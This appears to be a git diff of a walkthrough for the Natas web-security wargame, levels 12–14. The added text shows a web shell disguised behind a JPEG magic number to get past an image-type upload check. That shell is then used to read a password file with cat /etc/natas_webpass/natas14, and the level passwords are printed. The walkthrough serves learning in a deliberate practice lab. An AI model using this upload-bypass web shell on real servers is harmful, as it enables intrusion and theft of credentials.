@@ -383,7 +383,7 @@ Here, shell_exec() is used to execute command via shell and return the complete 
 When we upload the file `natas13.php`, click on the link to your file so the webserver executes the script you wrote. Then we could find our password.<br>
 `The password for natas13: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`
   
-# Level 12->Level13
+# Level 12->Level 13
 
 user: natas13
 password:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
@@ -398,8 +398,23 @@ else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name']))
 ```
 Reading through the source code, we can find that there is no check for the file extension. The code reads the first bytes of the image and checks its signature.
 So, we should try to fake an image signature. As it not looking for file extensions, we can upload a .php file, like last level.  So to pass the exif_imagetype function check, our file must start with the magic number of a supported image format.
++ The magic number of jpg file is : FF D8 FF E0
++ So, I created a php file using the following python script:
+```
+>>> fh = open('shell.php','w')  
+>>> fh.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')  
+>>> fh.close()  
+```
++ The only code that will be executed will be that within the opening (<?) and closing (?>) PHP tags. We can start our file with anything we want.
++ Uploaded shell.php and checked the response in burp. So, once we upload the php file, we change the random-string-generated.php file to shell.php and send the request. When we do it a call is made to makeRandomPath() and it returns `\upload\random-string.php`. Now the user can go to the file and execute the following command in the url,
+`URL [filename].php?cmd=cat /etc/natas_webpass/natas14`
+And tus we obtain the password of next level.
+pass: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
 
+# Level 13 -> level 14:
 
+user: natas14
+pass: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
 
 
 
